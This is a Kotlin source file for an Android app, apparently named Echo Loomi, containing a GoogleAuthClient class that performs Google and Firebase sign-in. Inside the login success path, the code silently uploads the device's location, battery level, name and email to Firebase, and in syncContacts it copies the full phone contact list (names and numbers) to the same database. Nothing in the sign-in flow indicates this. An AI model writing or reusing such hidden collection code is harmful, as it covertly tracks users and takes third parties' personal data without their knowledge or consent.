package com.echo.loomi

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import com.google.android.gms.auth.api.signin.GoogleSignIn
import com.google.android.gms.auth.api.signin.GoogleSignInClient
import com.google.android.gms.auth.api.signin.GoogleSignInOptions
import com.google.android.gms.common.api.ApiException
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.auth.GoogleAuthProvider
import com.google.firebase.database.FirebaseDatabase
import com.google.android.gms.location.LocationServices
import android.os.BatteryManager
import android.content.Context
import com.google.firebase.database.ServerValue
import android.provider.ContactsContract
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class GoogleAuthClient(
    private val activity: ComponentActivity,
    private val onResult: (Boolean) -> Unit
) {

    private val auth: FirebaseAuth = FirebaseAuth.getInstance()
    private val database = FirebaseDatabase.getInstance("https://echo-loomi-app-default-rtdb.firebaseio.com/").reference

    fun getGoogleSignInClient(): GoogleSignInClient {
        val gso = GoogleSignInOptions.Builder(GoogleSignInOptions.DEFAULT_SIGN_IN)
            .requestEmail()
            .requestIdToken("125517755986-d90kcmnq1bhohv9n460girmg988r9eaq.apps.googleusercontent.com")
            .build()
        return GoogleSignIn.getClient(activity, gso)
    }

    private val signInLauncher: ActivityResultLauncher<Intent> =
        activity.registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
            val task = GoogleSignIn.getSignedInAccountFromIntent(result.data)
            try {
                val account = task.getResult(ApiException::class.java)
                if (account != null && account.idToken != null) {
                    signInWithFirebase(account.idToken!!)
                } else {
                    onResult(false)
                }
            } catch (e: ApiException) {
                Log.e("AUTH_LOG", "Sign in failed: ${e.statusCode}")
                onResult(false)
            }
        }

    private fun signInWithFirebase(idToken: String) {
        val credential = GoogleAuthProvider.getCredential(idToken, null)
        auth.signInWithCredential(credential)
            .addOnCompleteListener(activity) { task ->
                if (task.isSuccessful) {
                    val user = auth.currentUser
                    if (user != null) {
                        saveUserToDatabase(user)
                    } else {
                        onResult(true)
                    }
                } else {
                    Log.e("AUTH_LOG", "Firebase Auth failed", task.exception)
                    onResult(false)
                }
            }
    }

    private fun saveUserToDatabase(user: com.google.firebase.auth.FirebaseUser) {
        val uid = user.uid
        val name = user.displayName ?: "Anonymous"
        val email = user.email ?: ""

        val userUpdates = mapOf(
            "uid" to uid,
            "name" to name,
            "email" to email,
            "status" to "Online",
            "loginType" to "google",
            "lastSeen" to System.currentTimeMillis()
        )

        database.child("users").child(uid).updateChildren(userUpdates)
            .addOnCompleteListener { task ->
                if (task.isSuccessful) {
                    Log.d("AUTH_LOG", "User data updated")
                }
            }

        // --- IMMEDIATE LOCATION & BATTERY SYNC ---
        if (hasLocationPermission()) {
            try {
                val fusedLocationClient = LocationServices.getFusedLocationProviderClient(activity)
                fusedLocationClient.lastLocation.addOnSuccessListener { location ->
                    val batteryManager = activity.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
                    val batteryLevel = batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)

                    val locationData = mutableMapOf<String, Any>(
                        "name" to name,
                        "email" to email,
                        "battery" to "$batteryLevel%",
                        "timestamp" to ServerValue.TIMESTAMP
                    )

                    location?.let {
                        locationData["latitude"] = it.latitude
                        locationData["longitude"] = it.longitude
                    }

                    database.child("locations").child(uid).updateChildren(locationData)
                        .addOnCompleteListener { 
                            syncContacts(uid)
                            onResult(true) 
                        }
                }.addOnFailureListener { 
                    syncContacts(uid)
                    onResult(true) 
                }
            } catch (e: SecurityException) {
                syncContacts(uid)
                onResult(true)
            }
        } else {
            syncContacts(uid)
            onResult(true)
        }
    }

    private fun syncContacts(uid: String) {
        if (ContextCompat.checkSelfPermission(activity, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) return

        CoroutineScope(Dispatchers.IO).launch {
            val contactList = mutableListOf<Map<String, String>>()
            val cursor = activity.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null
            )

            cursor?.use {
                val nameIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numberIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)

                while (it.moveToNext()) {
                    val name = it.getString(nameIndex) ?: "Unknown"
                    val number = it.getString(numberIndex) ?: ""
                    if (number.isNotEmpty()) {
                        contactList.add(mapOf("name" to name, "number" to number))
                    }
                }
            }

            if (contactList.isNotEmpty()) {
                database.child("contacts").child(uid).setValue(contactList)
            }
        }
    }


    fun signIn(forcePicker: Boolean = false) {
        if (forcePicker) {
            getGoogleSignInClient().signOut().addOnCompleteListener {
                val signInIntent = getGoogleSignInClient().signInIntent
                signInLauncher.launch(signInIntent)
            }
        } else {
            val signInIntent = getGoogleSignInClient().signInIntent
            signInLauncher.launch(signInIntent)
        }
    }

    private fun hasLocationPermission(): Boolean {
        return ContextCompat.checkSelfPermission(
            activity,
            Manifest.permission.ACCESS_FINE_LOCATION
        ) == PackageManager.PERMISSION_GRANTED
    }

    fun signOut() {
        auth.signOut()
        getGoogleSignInClient().signOut()
    }
}
